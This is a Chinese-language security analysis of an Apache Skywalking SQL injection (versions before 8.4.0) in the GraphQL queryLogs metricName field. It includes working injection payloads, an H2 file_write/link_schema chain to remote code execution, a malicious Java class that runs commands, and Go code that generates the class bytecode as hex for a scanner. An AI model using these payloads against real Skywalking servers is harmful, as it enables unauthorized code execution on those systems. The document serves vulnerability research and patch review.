# Skywalking远程代码执行漏洞分析

阅读量 **326295**

发布时间 : 2021-02-20 14:30:36

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t011fab86dbe8a86abe.jpg)

作者：白帽汇安全研究院[@kejaly](https://github.com/kejaly "@kejaly")

校对：白帽汇安全研究院[@r4v3zn](https://github.com/r4v3zn "@r4v3zn")

## 前言

Apache Skywalking
是分布式系统的应用程序性能监视工具，特别是为微服务，云原生和基于容器（Docker，Kubernetes，Mesos）的体系结构而设计的。

近日，Apache Skywalking 官方发布安全更新，修复了 Apache Skywalking 远程代码执行漏洞。

Skywalking
历史上存在两次SQL注入漏洞，CVE-2020-9483、CVE-2020-13921。此次漏洞（Skywalking小于v8.4.0）是由于之前两次SQL注入漏洞修复并不完善，仍存在一处SQL注入漏洞。结合
h2 数据库（默认的数据库），可以导致 RCE 。

## 环境搭建

idea调式环境搭建：

<https://www.cnblogs.com/goWithHappy/p/build-dev-env-for-skywalking.html#1.%E4%BE%9D%E8%B5%96%E5%B7%A5%E5%85%B7>

<https://github.com/apache/skywalking/blob/master/docs/en/guides/How-to-build.md#build-from-github>

下载地址skywalking v8.3.0版本：

<https://www.apache.org/dyn/closer.cgi/skywalking/8.3.0/apache-skywalking-apm-8.3.0-src.tgz>

然后按照官方的直接使用：

    
    
    ./mvnw compile -Dmaven.test.skip=true
    

![](https://p2.ssl.qhimg.com/t010d83369fe6080c96.png)

然后在 OAPServerStartUp.java main() 函数运行启动 OAPServer，skywalking-ui 目录运行 npm run
serve 启动前台服务，访问
[http://localhost:8081，就搭建起了整个环境。](http://localhost:8081%EF%BC%8C%E5%B0%B1%E6%90%AD%E5%BB%BA%E8%B5%B7%E4%BA%86%E6%95%B4%E4%B8%AA%E7%8E%AF%E5%A2%83%E3%80%82)

![](https://p1.ssl.qhimg.com/t013918af637c272a95.png)

但是在 RCE 的时候，用 idea 来启动项目 classpath 会有坑（因为 idea 会自动修改 classpath，导致一直 RCE
不成功），所以最后在 RCE 的时候使用官网提供的 distribution 中的 starup.bat 来启动。

下载地址： <https://www.apache.org/dyn/closer.cgi/skywalking/8.3.0/apache-skywalking-apm-8.3.0.tar.gz>

## 准备知识

###  GraphQL基础

exp 需要通过 GraphQL语句来构造，所以需要掌握 GraphQL 的基本知识

[GraphQL 查询语法](https://graphql.cn/learn/queries/)

springboot 和 GraphQL 的整合 可以查看下面这个系列的四篇文章：

[GraphQL的探索之路 –
一种为你的API而生的查询语言篇一](https://mp.weixin.qq.com/s?__biz=MzA4ODIyMzEwMg==&mid=2447535043&idx=1&sn=1044f088d88a37230fdcf546e29c0409&chksm=843bb7d2b34c3ec426e667e354729974c8902d5d8d355bf5aae4f45c705831fe738f4f76f895&scene=21#wechat_redirect)

[GraphQL的探索之路 –
SpringBoot集成GraphQL篇二](https://mp.weixin.qq.com/s?__biz=MzA4ODIyMzEwMg==&mid=2447535068&idx=1&sn=3efc4d37f8dd00f1fb3e93b4255fc7a6&chksm=843bb7cdb34c3edb1611c4ed823f7e35335a5e277009f920a4c18fd4c69d968250d7b3cbaf0b&scene=21#wechat_redirect)

[GraphQL的探索之路 –
SpringBoot集成GraphQL之Query篇三](https://zhuanlan.zhihu.com/p/210471003)

[GraphQL的探索之路 –
SpringBoot集成GraphQL之Mutation篇四](https://blog.csdn.net/linxingliang/article/details/108488730)

简单言之就是在 .graphqls 文件中定义服务，然后编写实现 **GraphQLQueryResolver** 的类里面定义服务名相同的方法，这样
GraphQL 的服务就和 具体的 java 方法对应起来了。

比如 这次漏洞 涉及的 queryLogs 服务：

oap-server\server-query-plugin\query-graphql-plugin\src\main\resouRCEs\query-protocol\log.graphqls:

![](https://p1.ssl.qhimg.com/t013394c24d994aa0c2.png)

oap-server\server-query-plugin\query-graphql-plugin\src\main\java\org\apache\skywalking\oap\query\graphql\resolver\LogQuery.java
:

![](https://p5.ssl.qhimg.com/t011300f2151150840f.png)

###  skywalking中graphql对应关系

skywalking 中 GraphQL 涉及到的 service 层 ，Resolver ， graphqls ，以及 Dao 的位置如下， 以
alarm.graphqls 为例：

Service 层：

    
    
    oap-server\server-core\src\main\java\org\apache\skywalking\oap\server\core\query\AlarmQueryService.java
    

实现 Resolver 接口层：

    
    
    oap-server\server-query-plugin\query-graphql-plugin\src\main\java\org\apache\skywalking\oap\query\graphql\resolver\AlarmQuery.java
    

对应的 graphqls 文件：

    
    
    oap-server\server-query-plugin\query-graphql-plugin\src\main\resouRCEs\query-protocol\alarm.graphqls
    

对应的 DAO ：

    
    
    oap-server\server-storage-plugin\storage-jdbc-hikaricp-plugin\src\main\java\org\apache\skywalking\oap\server\storage\plugin\jdbc\h2\dao\H2AlarmQueryDAO.java
    

###  漏洞分析

####  SQL注入漏洞点

根据 github 对应的 Pull ： <https://github.com/apache/skywalking/pull/6246/files>
定位到漏洞点

漏洞点在oap-server\server-storage-plugin\storage-jdbc-hikaricp-plugin\src\main\java\org\apache\skywalking\oap\server\storage\plugin\jdbc\h2\dao\H2LogQueryDAO.java
中的64 行，直接把 metricName append 到了 sql 中：

![](https://p5.ssl.qhimg.com/t01e58756b911ac59cf.png)

我们向上找调用 queryLogs 的地方，来到 oap-server\server-core\src\main\java\org\apache\skywalking\oap\server\core\query\LogQueryService.java
中的queryLogs 方法：

![](https://p4.ssl.qhimg.com/t011c65de67bd3d3516.png)

再向上找调用 LogQueryService 中的 queryLogs 的地方，会跳到 oap-server\server-query-plugin\query-graphql-plugin\src\main\java\org\apache\skywalking\oap\query\graphql\resolver\LogQuery.java
中的 queryLogs 方法：

![](https://p4.ssl.qhimg.com/t01eab2cc77bc0ff2d5.png)

方法所在的类正好实现了 GraphQLQueryResolver 接口，而且我们可以看到传入 getQueryService().queryLogs
方法的第一个参数(也就是之后的metricName) 是直接通过 condition.getMetricName() 来赋值的。

我们接着回到 H2LogQueryDAO.java 中:

![](https://p5.ssl.qhimg.com/t01983d78079be135d5.png)

buildCountStatement ：

![](https://p5.ssl.qhimg.com/t0181af419402326680.png)

计算 buildCountStatment(sql.toString()) ：

![](https://p0.ssl.qhimg.com/t01978cfb3871e2af65.png)

这里我们传入恶意 metricName 为 INFORMATION_SCHEMA.USERS union all select h2version())a
where 1=? or 1=? or 1=? —

成功报错带出结果：

![](https://p2.ssl.qhimg.com/t01e8f0bd0d019f0824.png)

###  RCE

说起 h2 sql 注入导致 RCE ， 大家第一反应肯定是利用堆叠注入来定义函数别名来执行 java 代码，比如这样构造exp：

    
    
    "metricName": "INFORMATION_SCHEMA.USERS union  select 1))a where 1=? or 1=? or 1=? ;CREATE ALIAS SHELLEXEC4 AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A'); if(s.hasNext()){return s.next();}else{return '';} }$$;CALL SHELLEXEC4('id');--    

但是这里不能执行多条语句，因为要执行 create 语句的话就需要使用分号闭合掉前面的 select 语句，而我们可以看到执行sql
语句的h2Clinet.executeQuery() 底层使用的 prepareStatement(sql)
，prepareStatementer只能编译一条语句，要编译多条语句则需要使用 addBatch 和 executeBatch 。

![](https://p4.ssl.qhimg.com/t01419bfefdac8ce4fd.png)

根据公开文档 <https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw> ，h2 可以通过
**file_write** 写文件 ， **link_schema** 底层使用了类加载。

####  file_write

![](https://p2.ssl.qhimg.com/t01b8b747227d4ae527.png)

file_write：

    
    
    "metricName": "INFORMATION_SCHEMA.USERS union  all select file_write('6162','evilClass'))a where 1=? or 1=? or 1=? --"，
    

####  link_schema

link_schema 函数底层存在一处类加载机制：

![](https://p0.ssl.qhimg.com/t0149e6970fc789cc7a.png)

![](https://p2.ssl.qhimg.com/t01c82cebe226addf3c.png)

![](https://p0.ssl.qhimg.com/t0104b3f9c046be4ce3.png)

loadUserClass 底层使用的是 Class.forName() 去加载:

![](https://p4.ssl.qhimg.com/t01afb7279388396c3e.png)

而这个 driver class 正好是 link_schema 的第二个参数。

link_schema：

    
    
    "metricName": "INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','evilClass','jdbc:h2:./test2','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --"
    

####  结合

那么我们就可以根据 file_write 来写一个恶意的 class 到服务器，把要执行的 java 代码写到 类的 static 块中，然后
linke_schema 去加载这个类，这样就可以执行任意的 java 代码了。

这里写恶意类的时候有个小技巧，可以先在本地安装 h2 ，然后利用 h2 来 file_read 读恶意类，file_read
出来的结果正好就是十六进制形式，所以就可以直接把结果作为 file_write() 的第一个参数

![](https://p4.ssl.qhimg.com/t010ce8729064826778.png)

###  坑

####  classpath

不得不提 idea 执行 debug 运行的坑，这个坑折腾了好久。使用 idea debug 运行的时候，idea 会修改 classpath
<https://blog.csdn.net/romantic_jie/article/details/107859901> ，

然后就导致调用 link_schema 的时候总是提示 class not found 的报错。

所以最后选择不使用 idea debug 运行，使用官网提供的 distribution 中的 starup.bat 来运行。

下载地址: <https://www.apache.org/dyn/closer.cgi/skywalking/8.3.0/apache-skywalking-apm-8.3.0.tar.gz>

####  双亲委派机制

另外由于双亲委派机制，导致加载一次恶意类之后，再去使用 link_schema
加载的时候无法加载。所以在实际使用的时候，需要再上传一个其他名字的恶意类来加载。

####  JDK 版本问题

由于 JVM 兼容性问题，使用低版本 JDK 启动 skywalking ，如果恶意类使用的编译环境比目标环境使用的 JDK 版本高的话，在类加载的时候会报
General error 错误。

![](https://p5.ssl.qhimg.com/t01c8398c5618d31d73.png)

考虑到现在市面上 JDK 版本基本都在 JDK 6 以及以上版本，所以为了使我们的恶意类都能加载，我们在生成恶意类的时候，最好使用 JDK 6 去生成。

    
    
    javac evil.java -target 1.6 -source 1.6
    

###  回显RCE

既然可以执行任意 java 代码，其实就可以反弹 shell 了，但是考虑到有些时候机器没法出网，所以需要想办法实现回显 RCE 。

因为得到 h2 version 是通过报错来回显的，所以第一个想法就是恶意类中把执行的结果作为异常来抛出，这样就能达到回显的效果，但是 loadClass
的时候只会执行 static 块中的代码，而 static 块中又无法向上抛出异常，所以这个思路行不通。

后来想了想，想到可以结合 **file_read()** 的方法来间接实现回显 RCE 。也就是说把执行的结果写到 output.txt 中，然后通过
file_read(“output.txt”,null) 去读取结果

恶意类 static 块如下：

    
    
    static {
        try {
            String cmd = "whoami";
            InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            InputStreamReader i = new InputStreamReader(in,"GBK");
            BufferedReader re = new BufferedReader(i);
            StringBuilder sb = new StringBuilder(1024);
            String line = null;
    
            while((line = re.readLine()) != null) {
                sb.append(line);
            }
    
            BufferedWriter out = new BufferedWriter(new FileWriter("output.txt"));
            out.write(String.valueOf(sb));
            out.close();
        } catch (IOException var7) {
        }
    }
    

file_read ：

    
    
    "metricName": "INFORMATION_SCHEMA.USERS union  all select  file_read('output.txt',null))a where 1=? or 1=? or 1=? --"
    

###  动态字节码

前面提到过，由于类加载机制，需要每次都上传一个恶意新的恶意 class 文件，但是其实两个 class 文件差异并不大，只是执行的命令 ，以及 class
文件名不同而已，所以可以编写两个恶意类，利用 beyond compare 等对比工具比较两个 class 文件的差异，找到差异的地方。

![](https://p2.ssl.qhimg.com/t01e0b21bee90089872.png)

那么我们在整合到 goby 的时候，思路就是每执行一条命令的时候，随机生成5位文件名，然后用户根据 要执行的命令来动态修改部分文件名。

    
    
    classHex := "cafebabe00000034006b07000201000a636c617373"
    cmd := "whoami"
    if ss.Params["cmd"] != nil{
        cmd = ss.Params["cmd"].(string)
    }
    // 生成随机文件名后缀 ， 比如 class01234 ， class12345
    rand.Seed(time.Now().UnixNano())
    // 随机文件名后缀名 以及 对应的十六进制
    fileNameSuffix := goutils.RandomHexString(5) //goby 中封装的生成随机hex的函数
    hexFileNameSuffixString :=  hex.EncodeToString([]byte(fileNameSuffix))
    
    filename := "class"+fileNameSuffix
    classHex += hexFileNameSuffixString
    classHex += "0700040100106a6176612f6c616e672f4f626a6563740100083C636C696E69743E010003282956010004436F64650800090100"
    cmdLen := fmt.Sprintf("%02x"，len(cmd))
    classHex += cmdLen
    cmdHex := hex.EncodeToString([]byte(cmd))
    classHex += cmdHex
    
    classHex += "0a000b000d07000c0100116a6176612f6c616e672f52756e74696d650c000e000f01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0a000b00110c0012001301000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0a001500170700160100116a6176612f6c616e672f50726f636573730c0018001901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b07001b0100196a6176612f696f2f496e70757453747265616d52656164657208001d01000347424b0a001a001f0c002000210100063c696e69743e01002a284c6a6176612f696f2f496e70757453747265616d3b4c6a6176612f6c616e672f537472696e673b29560700230100166a6176612f696f2f42756666657265645265616465720a002200250c00200026010013284c6a6176612f696f2f5265616465723b29560700280100176a6176612f6c616e672f537472696e674275696c6465720a0027002a0c0020002b010004284929560a0027002d0c002e002f010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0a002200310c00320033010008726561644c696e6501001428294c6a6176612f6c616e672f537472696e673b0700350100166a6176612f696f2f42756666657265645772697465720700370100126a6176612f696f2f46696c6557726974657208003901000a6f75747075742e7478740a0036003b0c0020003c010015284c6a6176612f6c616e672f537472696e673b29560a0034003e0c0020003f010013284c6a6176612f696f2f5772697465723b29560a004100430700420100106a6176612f6c616e672f537472696e670c0044004501000776616c75654f66010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f537472696e673b0a003400470c0048003c01000577726974650a0034004a0c004b0006010005636c6f736507004d0100136a6176612f696f2f494f457863657074696f6e01000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010003636d640100124c6a6176612f6c616e672f537472696e673b010002696e0100154c6a6176612f696f2f496e70757453747265616d3b0100016901001b4c6a6176612f696f2f496e70757453747265616d5265616465723b01000272650100184c6a6176612f696f2f42756666657265645265616465723b01000273620100194c6a6176612f6c616e672f537472696e674275696c6465723b0100046c696e650100036f75740100184c6a6176612f696f2f42756666657265645772697465723b01000d537461636b4d61705461626c6507005f0100136a6176612f696f2f496e70757453747265616d01000a457863657074696f6e730a000300620c002000060100047468697301000c4c636c617373"
    classHex += hexFileNameSuffixString
    
    classHex += "3b0100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b2956010004617267730100135b4c6a6176612f6c616e672f537472696e673b01000a536f7572636546696c6501000f636c617373"
    classHex += hexFileNameSuffixString
    
    classHex += "2e6a617661002100010003000000000003000800050006000100070000013b000500070000006c12084bb8000a2ab60010b600144cbb001a592b121cb7001e4dbb0022592cb700244ebb002759110400b700293a04013a05a7000b19041905b6002c572db60030593a05c7fff1bb003459bb0036591238b7003ab7003d3a0619061904b80040b600461906b60049a7000457b1000100000067006a004c0003004e0000003a000e0000000f00030010000e00110019001200220013002e00140031001500340016003c001500460018005800190062001a0067001b006b001e004f00000048000700030064005000510000000e00590052005300010019004e00540055000200220045005600570003002e003900580059000400310036005a005100050058000f005b005c0006005d000000270004ff0034000607004107005e07001a070022070027070041000007ff002d0000000107004c0000000020000600020060000000040001004c00070000003300010001000000052ab70061b100000002004e0000000a00020000000400040005004f0000000c00010000000500630064000000090065006600020060000000040001004c00070000002b0000000100000001b100000002004e0000000600010000000a004f0000000c0001000000010067006800000001006900000002006a"
    

## 历史SQL注入

skywalking 历史 sql 注入漏洞有两个，分别是 CVE-2020-9483 和 CVE-2020-13921 ，之前也提到此次漏洞是由于之前两次
sql 注入漏洞修复并不完善，仍存在一处 sql 注入漏洞。我们不妨也来看看这两个漏洞。

其实原因都是在执行 sql 语句的时候直接对用户可控的参数进行了拼接。

而这里说的可控，就是通过 GraphQL 语句来传入的参数。

####  CVE-2020-9483 [id 注入]

更改了一个文件，oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2MetricsQueryDAO.java
文件 <https://github.com/apache/skywalking/pull/4639/files>

![](https://p0.ssl.qhimg.com/t01d381f269f0750211.png)

把查询条件中的 id 换成使用预编译的方式来查询。

####  CVE-2020-13921 [多处注入]

原因是 参数直接拼接到 sql 执行语句中 <https://github.com/apache/skywalking/issues/4955>

![](https://p0.ssl.qhimg.com/t01aaca0a1a94613d6d.png)

有人提出 还有其他点存在直接拼接的问题。

作者修复方案如下，都是把直接拼接的换成了使用占位符预编译的方式:

![](https://p4.ssl.qhimg.com/t0175118b352e1bf3d8.png)

另外作者也按照了上面的提议修改了其他三个文件，也是使用这样的方法。都是采用占位符来查询。

修复的文件：

    
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2AlarmQueryDAO.java
    
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2MetadataQueryDAO.java [新增]
    
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2TraceQueryDAO.java
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/mysql/MySQLAlarmQueryDAO.java
    

但是上面的 issue 中还提到了：

    
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2LogQueryDAO.java
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2AggregationQueryDAO.java
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2TopNRecordsQueryDAO.java
    

作者对这三个没有修复。而这次的主角就是 h2LogQueryDao.java 中

![](https://p4.ssl.qhimg.com/t01db5fb223fd0248a8.png)

存在的 sql 注入，而且出问题的就是上面提到的那个地方 metricName 。

对于这次的 sql 注入，作者最后的修复方案是 直接删除这个metricName 字段

![](https://p5.ssl.qhimg.com/t018e7da4768b7f4b02.png)

    
    
    oap-server/server-storage-plugin/storage-jdbc-hikaricp-plugin/src/main/java/org/apache/skywalking/oap/server/storage/plugin/jdbc/h2/dao/H2LogQueryDAO.java
    另外由于删除字段，所以导致了有12处文件都修改了。
    

这也正是[Skywalking远程代码执行漏洞预警](https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw)中提到的未修复完善地方。

![](https://p1.ssl.qhimg.com/t0124b68b37540fa801.png)

## 思考

这三次 sql 注入的原因都是因为在执行 sql 语句的时候直接对用户可控的参数进行了拼接，于是尝试通过查看 Dao
中其他的文件找是不是还存在其他直接拼接的地方。

![](https://p1.ssl.qhimg.com/t01e227cdcca2b563f9.png)

![](https://p3.ssl.qhimg.com/t013ccec4b08e0506be.png)

翻了翻，发现基本都用了占位符预编译。

一开始发现一些直接拼接 metrics 的地方，但是并不存在注入，比如 H2AggregationQueryDAO 中的 sortMetrics ：

![](https://p0.ssl.qhimg.com/t0198867f81080b84d6.png)

向上找到 sortMetics :

![](https://p1.ssl.qhimg.com/t01a4729fc7ad19cdfa.png)

继续向上找:

![](https://p0.ssl.qhimg.com/t0169d85c2930209ef7.png)

对应的 aggregation.graphqls :

![](https://p0.ssl.qhimg.com/t012c8870be62fd1f93.png)

发现虽然有些是拼接了，但是

![](https://p5.ssl.qhimg.com/t015f09a6c94e52275a.png)

会进行判断，如果 condition.getName 是 UNKNOWN 的话就会直接返回。

## 参考

[Skywalking远程代码执行漏洞预警](https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw)

[[CVE-2020-9483/13921]Apache SkyWalking
SQL注入](https://blog.csdn.net/caiqiiqi/article/details/107857173)

[Apache SkyWalking SQL注入漏洞复现分析
(CVE-2020-9483)](https://mp.weixin.qq.com/s/91MWSDYkom2Z8EVYSY37Qw)

[Skywalking 8 源码编译 IDEA 运行问题](https://www.jianshu.com/p/6374cc8dc9c8)

[根据配置CLASSPATH彻底弄懂AppCLassLoader的加载路径问题](https://blog.csdn.net/romantic_jie/article/details/107859901)

[SkyWalking调试环境搭建](https://www.cnblogs.com/goWithHappy/p/build-dev-env-for-skywalking.html#1.%E4%BE%9D%E8%B5%96%E5%B7%A5%E5%85%B7)

[SkyWalking How to build
project](https://github.com/apache/skywalking/blob/master/docs/en/guides/How-to-build.md#build-from-github)

[GraphQL 查询和变更](https://graphql.cn/learn/queries/)

[GraphQL的探索之路 –
一种为你的API而生的查询语言篇一](https://mp.weixin.qq.com/s?__biz=MzA4ODIyMzEwMg==&mid=2447535043&idx=1&sn=1044f088d88a37230fdcf546e29c0409&chksm=843bb7d2b34c3ec426e667e354729974c8902d5d8d355bf5aae4f45c705831fe738f4f76f895&scene=21#wechat_redirect)

[GraphQL的探索之路 –
SpringBoot集成GraphQL篇二](https://mp.weixin.qq.com/s?__biz=MzA4ODIyMzEwMg==&mid=2447535068&idx=1&sn=3efc4d37f8dd00f1fb3e93b4255fc7a6&chksm=843bb7cdb34c3edb1611c4ed823f7e35335a5e277009f920a4c18fd4c69d968250d7b3cbaf0b&scene=21#wechat_redirect)

[GraphQL的探索之路 –
SpringBoot集成GraphQL之Query篇三](https://zhuanlan.zhihu.com/p/210471003)

[GraphQL的探索之路 –
SpringBoot集成GraphQL之Mutation篇四](https://blog.csdn.net/linxingliang/article/details/108488730)

[SkyWalking [CVE] Fix SQL Injection vulnerability in H2/MySQL implementation.
#4639](https://github.com/apache/skywalking/pull/4639/files)

[SkyWalking ALARM_MESSAGE Sql Inject
#4955](https://github.com/apache/skywalking/issues/4955)

[SkyWalking LogQuery remove unused field
#6246](https://github.com/apache/skywalking/pull/6246/files)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **白帽汇安全研究院** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/231753](/post/id/231753)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)

 **+1** __2赞

 __收藏

![](https://p0.ssl.qhimg.com/t01ab2bff67fbbb92a5.png) 白帽汇安全研究院

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

